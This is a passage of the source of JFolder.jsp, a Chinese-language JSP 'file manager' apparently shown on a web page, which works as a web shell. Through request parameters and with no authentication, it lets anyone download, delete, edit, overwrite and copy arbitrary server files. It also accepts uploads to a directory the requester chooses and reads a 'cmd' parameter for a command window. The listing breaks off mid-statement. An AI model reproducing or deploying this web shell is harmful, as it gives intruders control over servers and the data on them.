class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">/**</span><br><span class="line">JFolder V0.9  windows platform</span><br><span class="line">@Filename： JFolder.jsp </span><br><span class="line">@Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。</span><br><span class="line"></span><br><span class="line">@Bugs  :  下载时，中文文件名无法正常显示</span><br><span class="line">*/</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=gb2312&quot;%&gt;</span><br><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*&quot; %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">private final static int languageNo=0; //语言版本，0 : 中文； 1：英文</span><br><span class="line">String strThisFile=&quot;JFolder.jsp&quot;;</span><br><span class="line">String[] authorInfo=&#123;&quot; &lt;font color=red&gt; 岁月联盟-专用版 &lt;/font&gt;&quot;,&quot; &lt;font color=red&gt; Thanks for your support - - by Steven Cee http:// &lt;/font&gt;&quot;&#125;;</span><br><span class="line">String[] strFileManage   = &#123;&quot;文 件 管 理&quot;,&quot;File Management&quot;&#125;;</span><br><span class="line">String[] strCommand      = &#123;&quot;CMD 命 令&quot;,&quot;Command Window&quot;&#125;;</span><br><span class="line">String[] strSysProperty  = &#123;&quot;系 统 属 性&quot;,&quot;System Property&quot;&#125;;</span><br><span class="line">String[] strHelp         = &#123;&quot;帮 助&quot;,&quot;Help&quot;&#125;;</span><br><span class="line">String[] strParentFolder = &#123;&quot;上级目录&quot;,&quot;Parent Folder&quot;&#125;;</span><br><span class="line">String[] strCurrentFolder= &#123;&quot;当前目录&quot;,&quot;Current Folder&quot;&#125;;</span><br><span class="line">String[] strDrivers      = &#123;&quot;驱动器&quot;,&quot;Drivers&quot;&#125;;</span><br><span class="line">String[] strFileName     = &#123;&quot;文件名称&quot;,&quot;File Name&quot;&#125;;</span><br><span class="line">String[] strFileSize     = &#123;&quot;文件大小&quot;,&quot;File Size&quot;&#125;;</span><br><span class="line">String[] strLastModified = &#123;&quot;最后修改&quot;,&quot;Last Modified&quot;&#125;;</span><br><span class="line">String[] strFileOperation= &#123;&quot;文件操作&quot;,&quot;Operations&quot;&#125;;</span><br><span class="line">String[] strFileEdit     = &#123;&quot;修改&quot;,&quot;Edit&quot;&#125;;</span><br><span class="line">String[] strFileDown     = &#123;&quot;下载&quot;,&quot;Download&quot;&#125;;</span><br><span class="line">String[] strFileCopy     = &#123;&quot;复制&quot;,&quot;Move&quot;&#125;;</span><br><span class="line">String[] strFileDel      = &#123;&quot;删除&quot;,&quot;Delete&quot;&#125;;</span><br><span class="line">String[] strExecute      = &#123;&quot;执行&quot;,&quot;Execute&quot;&#125;;</span><br><span class="line">String[] strBack         = &#123;&quot;返回&quot;,&quot;Back&quot;&#125;;</span><br><span class="line">String[] strFileSave     = &#123;&quot;保存&quot;,&quot;Save&quot;&#125;;</span><br><span class="line"></span><br><span class="line">public class FileHandler</span><br><span class="line">&#123;</span><br><span class="line"> private String strAction=&quot;&quot;;</span><br><span class="line"> private String strFile=&quot;&quot;;</span><br><span class="line"> void FileHandler(String action,String f)</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static class UploadMonitor &#123;</span><br><span class="line"></span><br><span class="line">  static Hashtable uploadTable = new Hashtable();</span><br><span class="line"></span><br><span class="line">  static void set(String fName, UplInfo info) &#123;</span><br><span class="line">   uploadTable.put(fName, info);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void remove(String fName) &#123;</span><br><span class="line">   uploadTable.remove(fName);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static UplInfo getInfo(String fName) &#123;</span><br><span class="line">   UplInfo info = (UplInfo) uploadTable.get(fName);</span><br><span class="line">   return info;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class UplInfo &#123;</span><br><span class="line"></span><br><span class="line">  public long totalSize;</span><br><span class="line">  public long currSize;</span><br><span class="line">  public long starttime;</span><br><span class="line">  public boolean aborted;</span><br><span class="line"></span><br><span class="line">  public UplInfo() &#123;</span><br><span class="line">   totalSize = 0l;</span><br><span class="line">   currSize = 0l;</span><br><span class="line">   starttime = System.currentTimeMillis();</span><br><span class="line">   aborted = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public UplInfo(int size) &#123;</span><br><span class="line">   totalSize = size;</span><br><span class="line">   currSize = 0;</span><br><span class="line">   starttime = System.currentTimeMillis();</span><br><span class="line">   aborted = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getUprate() &#123;</span><br><span class="line">   long time = System.currentTimeMillis() - starttime;</span><br><span class="line">   if (time != 0) &#123;</span><br><span class="line">    long uprate = currSize * 1000 / time;</span><br><span class="line">    return convertFileSize(uprate) + &quot;/s&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   else return &quot;n/a&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public int getPercent() &#123;</span><br><span class="line">   if (totalSize == 0) return 0;</span><br><span class="line">   else return (int) (currSize * 100 / totalSize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getTimeElapsed() &#123;</span><br><span class="line">   long time = (System.currentTimeMillis() - starttime) / 1000l;</span><br><span class="line">   if (time - 60l &gt;= 0)&#123;</span><br><span class="line">    if (time % 60 &gt;=10) return time / 60 + &quot;:&quot; + (time % 60) + &quot;m&quot;;</span><br><span class="line">    else return time / 60 + &quot;:0&quot; + (time % 60) + &quot;m&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   else return time&lt;10 ? &quot;0&quot; + time + &quot;s&quot;: time + &quot;s&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getTimeEstimated() &#123;</span><br><span class="line">   if (currSize == 0) return &quot;n/a&quot;;</span><br><span class="line">   long time = System.currentTimeMillis() - starttime;</span><br><span class="line">   time = totalSize * time / currSize;</span><br><span class="line">   time /= 1000l;</span><br><span class="line">   if (time - 60l &gt;= 0)&#123;</span><br><span class="line">    if (time % 60 &gt;=10) return time / 60 + &quot;:&quot; + (time % 60) + &quot;m&quot;;</span><br><span class="line">    else return time / 60 + &quot;:0&quot; + (time % 60) + &quot;m&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   else return time&lt;10 ? &quot;0&quot; + time + &quot;s&quot;: time + &quot;s&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public class FileInfo &#123;</span><br><span class="line"></span><br><span class="line">  public String name = null, clientFileName = null, fileContentType = null;</span><br><span class="line">  private byte[] fileContents = null;</span><br><span class="line">  public File file = null;</span><br><span class="line">  public StringBuffer sb = new StringBuffer(100);</span><br><span class="line"></span><br><span class="line">  public void setFileContents(byte[] aByteArray) &#123;</span><br><span class="line">   fileContents = new byte[aByteArray.length];</span><br><span class="line">   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// A Class with methods used to process a ServletInputStream</span><br><span class="line">public class HttpMultiPartParser &#123;</span><br><span class="line"></span><br><span class="line">  private final String lineSeparator = System.getProperty(&quot;line.separator&quot;, &quot;\n&quot;);</span><br><span class="line">  private final int ONE_MB = 1024 * 1;</span><br><span class="line"></span><br><span class="line">  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,</span><br><span class="line">    int clength) throws IllegalArgumentException, IOException &#123;</span><br><span class="line">   if (is == null) throw new IllegalArgumentException(&quot;InputStream&quot;);</span><br><span class="line">   if (boundary == null || boundary.trim().length() &lt; 1) throw new IllegalArgumentException(</span><br><span class="line">     &quot;\&quot;&quot; + boundary + &quot;\&quot; is an illegal boundary indicator&quot;);</span><br><span class="line">   boundary = &quot;--&quot; + boundary;</span><br><span class="line">   StringTokenizer stLine = null, stFields = null;</span><br><span class="line">   FileInfo fileInfo = null;</span><br><span class="line">   Hashtable dataTable = new Hashtable(5);</span><br><span class="line">   String line = null, field = null, paramName = null;</span><br><span class="line">   boolean saveFiles = (saveInDir != null &amp;&amp; saveInDir.trim().length() &gt; 0);</span><br><span class="line">   boolean isFile = false;</span><br><span class="line">   if (saveFiles) &#123; // Create the required directory (including parent dirs)</span><br><span class="line">    File f = new File(saveInDir);</span><br><span class="line">    f.mkdirs();</span><br><span class="line">   &#125;</span><br><span class="line">   line = getLine(is);</span><br><span class="line">   if (line == null || !line.startsWith(boundary)) throw new IOException(</span><br><span class="line">     &quot;Boundary not found; boundary = &quot; + boundary + &quot;, line = &quot; + line);</span><br><span class="line">   while (line != null) &#123;</span><br><span class="line">    if (line == null || !line.startsWith(boundary)) return dataTable;</span><br><span class="line">    line = getLine(is);</span><br><span class="line">    if (line == null) return dataTable;</span><br><span class="line">    stLine = new StringTokenizer(line, &quot;;\r\n&quot;);</span><br><span class="line">    if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(</span><br><span class="line">      &quot;Bad data in second line&quot;);</span><br><span class="line">    line = stLine.nextToken().toLowerCase();</span><br><span class="line">    if (line.indexOf(&quot;form-data&quot;) &lt; 0) throw new IllegalArgumentException(</span><br><span class="line">      &quot;Bad data in second line&quot;);</span><br><span class="line">    stFields = new StringTokenizer(stLine.nextToken(), &quot;=\&quot;&quot;);</span><br><span class="line">    if (stFields.countTokens() &lt; 2) throw new IllegalArgumentException(</span><br><span class="line">      &quot;Bad data in second line&quot;);</span><br><span class="line">    fileInfo = new FileInfo();</span><br><span class="line">    stFields.nextToken();</span><br><span class="line">    paramName = stFields.nextToken();</span><br><span class="line">    isFile = false;</span><br><span class="line">    if (stLine.hasMoreTokens()) &#123;</span><br><span class="line">     field = stLine.nextToken();</span><br><span class="line">     stFields = new StringTokenizer(field, &quot;=\&quot;&quot;);</span><br><span class="line">     if (stFields.countTokens() &gt; 1) &#123;</span><br><span class="line">      if (stFields.nextToken().trim().equalsIgnoreCase(&quot;filename&quot;)) &#123;</span><br><span class="line">       fileInfo.name = paramName;</span><br><span class="line">       String value = stFields.nextToken();</span><br><span class="line">       if (value != null &amp;&amp; value.trim().length() &gt; 0) &#123;</span><br><span class="line">        fileInfo.clientFileName = value;</span><br><span class="line">        isFile = true;</span><br><span class="line">       &#125;</span><br><span class="line">       else &#123;</span><br><span class="line">        line = getLine(is); // Skip &quot;Content-Type:&quot; line</span><br><span class="line">        line = getLine(is); // Skip blank line</span><br><span class="line">        line = getLine(is); // Skip blank line</span><br><span class="line">        line = getLine(is); // Position to boundary line</span><br><span class="line">        continue;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     else if (field.toLowerCase().indexOf(&quot;filename&quot;) &gt;= 0) &#123;</span><br><span class="line">      line = getLine(is); // Skip &quot;Content-Type:&quot; line</span><br><span class="line">      line = getLine(is); // Skip blank line</span><br><span class="line">      line = getLine(is); // Skip blank line</span><br><span class="line">      line = getLine(is); // Position to boundary line</span><br><span class="line">      continue;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    boolean skipBlankLine = true;</span><br><span class="line">    if (isFile) &#123;</span><br><span class="line">     line = getLine(is);</span><br><span class="line">     if (line == null) return dataTable;</span><br><span class="line">     if (line.trim().length() &lt; 1) skipBlankLine = false;</span><br><span class="line">     else &#123;</span><br><span class="line">      stLine = new StringTokenizer(line, &quot;: &quot;);</span><br><span class="line">      if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(</span><br><span class="line">        &quot;Bad data in third line&quot;);</span><br><span class="line">      stLine.nextToken(); // Content-Type</span><br><span class="line">      fileInfo.fileContentType = stLine.nextToken();</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">if (skipBlankLine) &#123;</span><br><span class="line">     line = getLine(is);</span><br><span class="line">     if (line == null) return dataTable;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!isFile) &#123;</span><br><span class="line">     line = getLine(is);</span><br><span class="line">     if (line == null) return dataTable;</span><br><span class="line">     dataTable.put(paramName, line);</span><br><span class="line">     // If parameter is dir, change saveInDir to dir</span><br><span class="line">     if (paramName.equals(&quot;dir&quot;)) saveInDir = line;</span><br><span class="line">     line = getLine(is);</span><br><span class="line">     continue;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">     UplInfo uplInfo = new UplInfo(clength);</span><br><span class="line">     UploadMonitor.set(fileInfo.clientFileName, uplInfo);</span><br><span class="line">     OutputStream os = null;</span><br><span class="line">     String path = null;</span><br><span class="line">     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,</span><br><span class="line">       fileInfo.clientFileName));</span><br><span class="line">     else os = new ByteArrayOutputStream(ONE_MB);</span><br><span class="line">     boolean readingContent = true;</span><br><span class="line">     byte previousLine[] = new byte[2 * ONE_MB];</span><br><span class="line">     byte temp[] = null;</span><br><span class="line">     byte currentLine[] = new byte[2 * ONE_MB];</span><br><span class="line">     int read, read3;</span><br><span class="line">     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) &#123;</span><br><span class="line">      line = null;</span><br><span class="line">      break;</span><br><span class="line">     &#125;</span><br><span class="line">     while (readingContent) &#123;</span><br><span class="line">      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) &#123;</span><br><span class="line">       line = null;</span><br><span class="line">       uplInfo.aborted = true;</span><br><span class="line">       break;</span><br><span class="line">      &#125;</span><br><span class="line">      if (compareBoundary(boundary, currentLine)) &#123;</span><br><span class="line">       os.write(previousLine, 0, read - 2);</span><br><span class="line">       line = new String(currentLine, 0, read3);</span><br><span class="line">       break;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">       os.write(previousLine, 0, read);</span><br><span class="line">       uplInfo.currSize += read;</span><br><span class="line">       temp = currentLine;</span><br><span class="line">       currentLine = previousLine;</span><br><span class="line">       previousLine = temp;</span><br><span class="line">       read = read3;</span><br><span class="line">      &#125;//end else</span><br><span class="line">     &#125;//end while</span><br><span class="line">     os.flush();</span><br><span class="line">     os.close();</span><br><span class="line">     if (!saveFiles) &#123;</span><br><span class="line">      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;</span><br><span class="line">      fileInfo.setFileContents(baos.toByteArray());</span><br><span class="line">     &#125;</span><br><span class="line">     else fileInfo.file = new File(path);</span><br><span class="line">     dataTable.put(paramName, fileInfo);</span><br><span class="line">     uplInfo.currSize = uplInfo.totalSize;</span><br><span class="line">    &#125;//end try</span><br><span class="line">    catch (IOException e) &#123;</span><br><span class="line">     throw e;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return dataTable;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * Compares boundary string to byte array</span><br><span class="line">   */</span><br><span class="line">  private boolean compareBoundary(String boundary, byte ba[]) &#123;</span><br><span class="line">   byte b;</span><br><span class="line">   if (boundary == null || ba == null) return false;</span><br><span class="line">   for (int i = 0; i &lt; boundary.length(); i++)</span><br><span class="line">    if ((byte) boundary.charAt(i) != ba[i]) return false;</span><br><span class="line">   return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /** Convenience method to read HTTP header lines */</span><br><span class="line">  private synchronized String getLine(ServletInputStream sis) throws IOException &#123;</span><br><span class="line">   byte b[] = new byte[1024];</span><br><span class="line">   int read = sis.readLine(b, 0, b.length), index;</span><br><span class="line">   String line = null;</span><br><span class="line">   if (read != -1) &#123;</span><br><span class="line">    line = new String(b, 0, read);</span><br><span class="line">    if ((index = line.indexOf(&#x27;\n&#x27;)) &gt;= 0) line = line.substring(0, index - 1);</span><br><span class="line">   &#125;</span><br><span class="line">   return line;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getFileName(String dir, String fileName) throws IllegalArgumentException &#123;</span><br><span class="line">   String path = null;</span><br><span class="line">   if (dir == null || fileName == null) throw new IllegalArgumentException(</span><br><span class="line">     &quot;dir or fileName is null&quot;);</span><br><span class="line">   int index = fileName.lastIndexOf(&#x27;/&#x27;);</span><br><span class="line">   String name = null;</span><br><span class="line">   if (index &gt;= 0) name = fileName.substring(index + 1);</span><br><span class="line">   else name = fileName;</span><br><span class="line">   index = name.lastIndexOf(&#x27;\\&#x27;);</span><br><span class="line">   if (index &gt;= 0) fileName = name.substring(index + 1);</span><br><span class="line">   path = dir + File.separator + fileName;</span><br><span class="line">   if (File.separatorChar == &#x27;/&#x27;) return path.replace(&#x27;\\&#x27;, File.separatorChar);</span><br><span class="line">   else return path.replace(&#x27;/&#x27;, File.separatorChar);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; //End of class HttpMultiPartParser</span><br><span class="line"></span><br><span class="line">String formatPath(String p)</span><br><span class="line">&#123;</span><br><span class="line"> StringBuffer sb=new StringBuffer();</span><br><span class="line"> for (int i = 0; i &lt; p.length(); i++) </span><br><span class="line"> &#123;</span><br><span class="line">  if(p.charAt(i)==&#x27;\\&#x27;)</span><br><span class="line">  &#123;</span><br><span class="line">   sb.append(&quot;\\\\&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">   sb.append(p.charAt(i));</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> /**</span><br><span class="line">  * Converts some important chars (int) to the corresponding html string</span><br><span class="line">  */</span><br><span class="line"> static String conv2Html(int i) &#123;</span><br><span class="line">  if (i == &#x27;&amp;&#x27;) return &quot;&amp;amp;&quot;;</span><br><span class="line">  else if (i == &#x27;&lt;&#x27;) return &quot;&amp;lt;&quot;;</span><br><span class="line">  else if (i == &#x27;&gt;&#x27;) return &quot;&amp;gt;&quot;;</span><br><span class="line">  else if (i == &#x27;&quot;&#x27;) return &quot;&amp;quot;&quot;;</span><br><span class="line">  else return &quot;&quot; + (char) i;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /**</span><br><span class="line">  * Converts a normal string to a html conform string</span><br><span class="line">  */</span><br><span class="line"> static String htmlEncode(String st) &#123;</span><br><span class="line">  StringBuffer buf = new StringBuffer();</span><br><span class="line">  for (int i = 0; i &lt; st.length(); i++) &#123;</span><br><span class="line">   buf.append(conv2Html(st.charAt(i)));</span><br><span class="line">  &#125;</span><br><span class="line">  return buf.toString();</span><br><span class="line"> &#125;</span><br><span class="line">String getDrivers()</span><br><span class="line">/**</span><br><span class="line">Windows系统上取得可用的所有逻辑盘</span><br><span class="line">*/</span><br><span class="line">&#123;</span><br><span class="line"> StringBuffer sb=new StringBuffer(strDrivers[languageNo] + &quot; : &quot;);</span><br><span class="line"> File roots[]=File.listRoots();</span><br><span class="line"> for(int i=0;i&lt;roots.length;i++)</span><br><span class="line"> &#123;</span><br><span class="line">  sb.append(&quot; &lt;a href=\&quot;javascript:doForm(&#x27;&#x27;,&#x27;&quot;+roots[i]+&quot;\\&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;1&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">  sb.append(roots[i]+&quot;&lt;/a&gt;&amp;nbsp;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> return sb.toString();</span><br><span class="line">&#125;</span><br><span class="line">static String convertFileSize(long filesize)</span><br><span class="line">&#123;</span><br><span class="line"> //bug 5.09M 显示5.9M</span><br><span class="line"> String strUnit=&quot;Bytes&quot;;</span><br><span class="line"> String strAfterComma=&quot;&quot;;</span><br><span class="line"> int intDivisor=1;</span><br><span class="line"> if(filesize&gt;=1024*1024)</span><br><span class="line"> &#123;</span><br><span class="line">  strUnit = &quot;MB&quot;;</span><br><span class="line">  intDivisor=1024*1024;</span><br><span class="line"> &#125;</span><br><span class="line"> else if(filesize&gt;=1024)</span><br><span class="line"> &#123;</span><br><span class="line">  strUnit = &quot;KB&quot;;</span><br><span class="line">  intDivisor=1024;</span><br><span class="line"> &#125;</span><br><span class="line"> if(intDivisor==1) return filesize + &quot; &quot; + strUnit;</span><br><span class="line"> strAfterComma = &quot;&quot; + 100 * (filesize % intDivisor) / intDivisor ;</span><br><span class="line"> if(strAfterComma==&quot;&quot;) strAfterComma=&quot;.0&quot;;</span><br><span class="line"> return filesize / intDivisor + &quot;.&quot; + strAfterComma + &quot; &quot; + strUnit;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">request.setCharacterEncoding(&quot;gb2312&quot;);</span><br><span class="line">String tabID = request.getParameter(&quot;tabID&quot;);</span><br><span class="line">String strDir = request.getParameter(&quot;path&quot;);</span><br><span class="line">String strAction = request.getParameter(&quot;action&quot;);</span><br><span class="line">String strFile = request.getParameter(&quot;file&quot;);</span><br><span class="line">String strPath = strDir + &quot;\\&quot; + strFile; </span><br><span class="line">String strCmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">StringBuffer sbEdit=new StringBuffer(&quot;&quot;);</span><br><span class="line">StringBuffer sbDown=new StringBuffer(&quot;&quot;);</span><br><span class="line">StringBuffer sbCopy=new StringBuffer(&quot;&quot;);</span><br><span class="line">StringBuffer sbSaveCopy=new StringBuffer(&quot;&quot;);</span><br><span class="line">StringBuffer sbNewFile=new StringBuffer(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">if((tabID==null) || tabID.equals(&quot;&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> tabID = &quot;1&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strDir==null||strDir.length()&lt;1)</span><br><span class="line">&#123;</span><br><span class="line"> strDir = request.getRealPath(&quot;/&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;down&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> File f=new File(strPath);</span><br><span class="line"> if(f.length()==0)</span><br><span class="line"> &#123;</span><br><span class="line">  sbDown.append(&quot;文件大小为 0 字节，就不用下了吧&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">  response.setHeader(&quot;content-type&quot;,&quot;text/html; charset=ISO-8859-1&quot;);</span><br><span class="line">  response.setContentType(&quot;APPLICATION/OCTET-STREAM&quot;); </span><br><span class="line">  response.setHeader(&quot;Content-Disposition&quot;,&quot;attachment; filename=\&quot;&quot;+f.getName()+&quot;\&quot;&quot;);</span><br><span class="line">  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());</span><br><span class="line">  out.clearBuffer();</span><br><span class="line">  int i;</span><br><span class="line">  while ((i=fileInputStream.read()) != -1)</span><br><span class="line">  &#123;</span><br><span class="line">   out.write(i); </span><br><span class="line">  &#125;</span><br><span class="line">  fileInputStream.close();</span><br><span class="line">  out.close();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;del&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> File f=new File(strPath);</span><br><span class="line"> f.delete();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;edit&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> File f=new File(strPath); </span><br><span class="line"> BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));</span><br><span class="line"> sbEdit.append(&quot;&lt;form name=&#x27;frmEdit&#x27; action=&#x27;&#x27; method=&#x27;POST&#x27;&gt;\r\n&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;input type=hidden name=action value=save &gt;\r\n&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;input type=hidden name=path value=&#x27;&quot;+strDir+&quot;&#x27; &gt;\r\n&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;input type=hidden name=file value=&#x27;&quot;+strFile+&quot;&#x27; &gt;\r\n&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;input type=submit name=save value=&#x27; &quot;+strFileSave[languageNo]+&quot; &#x27;&gt; &quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;input type=button name=goback value=&#x27; &quot;+strBack[languageNo]+&quot; &#x27; onclick=&#x27;history.back(-1);&#x27;&gt; &amp;nbsp;&quot;+strPath+&quot;\r\n&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;br&gt;&lt;textarea rows=30 cols=90 name=content&gt;&quot;);</span><br><span class="line"> String line=&quot;&quot;;</span><br><span class="line"> while((line=br.readLine())!=null)</span><br><span class="line"> &#123;</span><br><span class="line">  sbEdit.append(htmlEncode(line)+&quot;\r\n&quot;);  </span><br><span class="line"> &#125;</span><br><span class="line">   sbEdit.append(&quot;&lt;/textarea&gt;&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;input type=hidden name=path value=&quot;+strDir+&quot;&gt;&quot;);</span><br><span class="line"> sbEdit.append(&quot;&lt;/form&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;save&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> File f=new File(strPath);</span><br><span class="line"> BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));</span><br><span class="line"> String strContent=request.getParameter(&quot;content&quot;);</span><br><span class="line"> bw.write(strContent);</span><br><span class="line"> bw.close();</span><br><span class="line">&#125;</span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;copy&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> File f=new File(strPath);</span><br><span class="line"> sbCopy.append(&quot;&lt;br&gt;&lt;form name=&#x27;frmCopy&#x27; action=&#x27;&#x27; method=&#x27;POST&#x27;&gt;\r\n&quot;);</span><br><span class="line"> sbCopy.append(&quot;&lt;input type=hidden name=action value=savecopy &gt;\r\n&quot;);</span><br><span class="line"> sbCopy.append(&quot;&lt;input type=hidden name=path value=&#x27;&quot;+strDir+&quot;&#x27; &gt;\r\n&quot;);</span><br><span class="line"> sbCopy.append(&quot;&lt;input type=hidden name=file value=&#x27;&quot;+strFile+&quot;&#x27; &gt;\r\n&quot;);</span><br><span class="line"> sbCopy.append(&quot;原始文件： &quot;+strPath+&quot;&lt;p&gt;&quot;);</span><br><span class="line"> sbCopy.append(&quot;目标文件： &lt;input type=text name=file2 size=40 value=&#x27;&quot;+strDir+&quot;&#x27;&gt;&lt;p&gt;&quot;);</span><br><span class="line"> sbCopy.append(&quot;&lt;input type=submit name=save value=&#x27; &quot;+strFileCopy[languageNo]+&quot; &#x27;&gt; &quot;);</span><br><span class="line"> sbCopy.append(&quot;&lt;input type=button name=goback value=&#x27; &quot;+strBack[languageNo]+&quot; &#x27; onclick=&#x27;history.back(-1);&#x27;&gt; &lt;p&gt;&amp;nbsp;\r\n&quot;);</span><br><span class="line"> sbCopy.append(&quot;&lt;/form&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;savecopy&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> File f=new File(strPath);</span><br><span class="line"> String strDesFile=request.getParameter(&quot;file2&quot;);</span><br><span class="line"> if(strDesFile==null || strDesFile.equals(&quot;&quot;))</span><br><span class="line"> &#123;</span><br><span class="line">  sbSaveCopy.append(&quot;&lt;p&gt;&lt;font color=red&gt;目标文件错误。&lt;/font&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">  File f_des=new File(strDesFile);</span><br><span class="line">  if(f_des.isFile())</span><br><span class="line">  &#123;</span><br><span class="line">   sbSaveCopy.append(&quot;&lt;p&gt;&lt;font color=red&gt;目标文件已存在,不能复制。&lt;/font&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">   String strTmpFile=strDesFile;</span><br><span class="line">   if(f_des.isDirectory())</span><br><span class="line">   &#123;</span><br><span class="line">    if(!strDesFile.endsWith(&quot;\\&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">     strDesFile=strDesFile+&quot;\\&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    strTmpFile=strDesFile+&quot;cqq_&quot;+strFile;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">   File f_des_copy=new File(strTmpFile);</span><br><span class="line">   FileInputStream in1=new FileInputStream(f);</span><br><span class="line">   FileOutputStream out1=new FileOutputStream(f_des_copy);</span><br><span class="line">   byte[] buffer=new byte[1024];</span><br><span class="line">   int 